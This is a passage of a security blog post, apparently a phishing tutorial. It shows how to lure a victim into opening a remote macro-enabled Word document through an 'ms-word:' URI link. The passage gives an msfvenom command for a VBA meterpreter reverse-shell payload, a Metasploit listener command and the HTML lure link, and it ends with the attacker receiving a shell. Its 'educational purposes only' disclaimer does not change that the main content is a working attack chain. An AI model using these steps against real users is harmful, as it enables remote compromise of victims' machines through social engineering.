  <li><strong>When clicked, the link directly opens MS Word, Excel, or another app</strong>, automatically retrieving a remote <strong>macro-enabled</strong> document.</li>
  <li><strong>If macros are enabled, the malicious code executes</strong>, leading to initial compromise.</li>
</ol>

<p>And that is what we are going to do :”</p>

<hr />
<p>first we will generate a vba reverse shell code using msfvenom</p>
<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>msfvenom <span class="nt">-x</span> x64 <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">lport</span><span class="o">=</span>443 <span class="nv">lhost</span><span class="o">=</span>192.168.1.8 <span class="nt">-f</span> vba |xsel <span class="nt">--clipboard</span>

</pre></td></tr></tbody></table></code></div></div>
<p><a href="https://github.com/user-attachments/assets/c78859c6-2b9d-41bd-a10e-583fd9166066" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/c78859c6-2b9d-41bd-a10e-583fd9166066" alt="Image" loading="lazy"></a></p>

<p>and start the listener using the multi/handler module in metasploit</p>
<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>msfconsole <span class="nt">-x</span> <span class="s2">"use multi/handler;set lhost 192.168.1.8;set lport 443;set payload windows/x64/meterpreter/reverse_tcp;run"</span>
</pre></td></tr></tbody></table></code></div></div>
<p>next make a word document file with macros that will contain the shellcode generated from msfvenom
<a href="https://github.com/user-attachments/assets/bb8de95f-ca9a-4a27-83e7-5d9c7fdff329" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/bb8de95f-ca9a-4a27-83e7-5d9c7fdff329" alt="Image" loading="lazy"></a></p>

<p>After setting up the malicious document, the attacker hosts or embeds it on a website. Now, all they need is for someone to <strong>click the link</strong>, which will open the document <strong>directly in Microsoft Word</strong>. If the victim enables macros, the attack is successful—simple and effective.
<a href="https://github.com/user-attachments/assets/d1cd2f07-ae69-4798-9669-5c4f8b6348d7" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/d1cd2f07-ae69-4798-9669-5c4f8b6348d7" alt="Image" loading="lazy"></a></p>
<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"ms-word:ofe|u|http://192.168.1.8:8080/mymacro.doc"</span><span class="na">class=</span><span class="s">"btn quote"</span> <span class="nt">&gt;</span>
Seek the Truth
<span class="nt">&lt;/a&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">ms-word:</code></strong> → The <strong>custom URI scheme</strong> registered by Microsoft Word.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">ofe|u|</code></strong> → Special flags that tell Word how to handle the document:
    <ul>
      <li><strong><code class="language-plaintext highlighter-rouge">ofe</code></strong> → Open in <strong>editing mode</strong>.</li>
      <li><strong><code class="language-plaintext highlighter-rouge">u</code></strong> → Specifies that the file is located at a URL.</li>
    </ul>
  </li>
  <li><strong><code class="language-plaintext highlighter-rouge">http://192.168.1.8:8080/mymacro.doc</code></strong> → The actual <strong>document URL</strong> to be opened.
When this link is executed (e.g., pasted in a browser’s address bar or run via <code class="language-plaintext highlighter-rouge">Win + R</code>), Microsoft Word will:
    <ol>
      <li><strong>Launch Word (if not already open).</strong></li>
      <li><strong>Fetch the document</strong> from the specified URL.</li>
      <li><strong>Open it directly</strong> in <strong>editable mode</strong>.
and just by convincing the victim to just visit the site and clicks the button
<a href="https://github.com/user-attachments/assets/db3e6002-d05d-4566-a5bb-b78f1709c11d" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/db3e6002-d05d-4566-a5bb-b78f1709c11d" alt="Image" loading="lazy"></a>
he will be prompted to open Microsoft Word
<a href="https://github.com/user-attachments/assets/55ef5ea1-0924-4410-8ee0-4bc17ded66b8" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/55ef5ea1-0924-4410-8ee0-4bc17ded66b8" alt="Image" loading="lazy"></a>
the word will start downloading the file and opens it
<a href="https://github.com/user-attachments/assets/6becc8e7-17ba-435a-b91d-604e3d4beb9e" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/6becc8e7-17ba-435a-b91d-604e3d4beb9e" alt="Image" loading="lazy"></a></li>
    </ol>
  </li>
</ul>

<p>and if the victim enables editing and macros the malicious code will execute and the attacker will get a reverse shell connection back to his C2 or listener.
<a href="https://github.com/user-attachments/assets/937bd8c5-71f7-498f-89a5-aede10ff4bfc" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/937bd8c5-71f7-498f-89a5-aede10ff4bfc" alt="Image" loading="lazy"></a></p>

<p>And that’s it. I hope no one gets tricked by this. and Remember, this is for educational purposes only— please please do not use it maliciously.<br />
stay safe people..</p>

<hr />
<h3 id="references"><span class="me-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><a href="https://learn.microsoft.com/en-us/office/client-developer/office-uri-schemes#13-uri-schema">Microsoft Office URI Schemes</a></li>
  <li><a href="https://ogp.me/">Open Graph Protocol</a></li>
  <li><a href="https://www.freecodecamp.org/news/what-is-open-graph-and-how-can-i-use-it-for-my-website/">What is Open Graph and How Can I Use It?</a></li>
</ul>
</div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
    <div class="post-meta mb-3">
      <i class="far fa-folder-open fa-fw me-1"></i>
      
      <a
        href="/categories/phishing/"
        >phishing</a
      >
    </div>
    

    <!-- tags -->
    
    <div class="post-tags">
      <i class="fa fa-tags fa-fw me-1"></i>
      
      <a
        href="/tags/phishing/"
        class="post-tag no-text-decoration"
      >phishing</a>
      
    </div>
    

    <div
      class="post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2"
    >
      <div class="license-wrapper">
          This post is licensed under this 
        <a href="https://mohamedaboelnasr.github.io">
          blog
        </a>
         by the author. 
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Abusing%20OG%20Protocol%20With%20Macros%20-%20Hell%E2%80%99s%20Executioner&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAbusing-OG-Protocol-With-Macros%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Abusing%20OG%20Protocol%20With%20Macros%20-%20Hell%E2%80%99s%20Executioner&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAbusing-OG-Protocol-With-Macros%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAbusing-OG-Protocol-With-Macros%2F&text=Abusing%20OG%20Protocol%20With%20Macros%20-%20Hell%E2%80%99s%20Executioner" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Penforce/">Penforce CTF</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Blind-Trust/">Blind Trust</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Reset-Writeup/">Reset Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Abusing-OG-Protocol-With-Macros/">Abusing OG Protocol With Macros</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Hiding-Your-Shell-code-inside-PE-File-Format/">Hiding Your Shell code inside PE File Format</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ad/">AD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/asc25/">ASC25</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/maldev/">maldev</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/penforce/">Penforce</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">phishing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/wininternals/">wininternals</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Hiding-Your-Shell-code-inside-PE-File-Format/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Hiding Your Shell code inside PE File Format</p>
    </a>
  

  
    <a
      href="/posts/Blind-Trust/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Blind Trust</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/Abo_Elnasr101">Aboelnasr</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ad/">AD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/asc25/">ASC25</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/maldev/">maldev</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/penforce/">Penforce</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">phishing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/wininternals/">wininternals</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

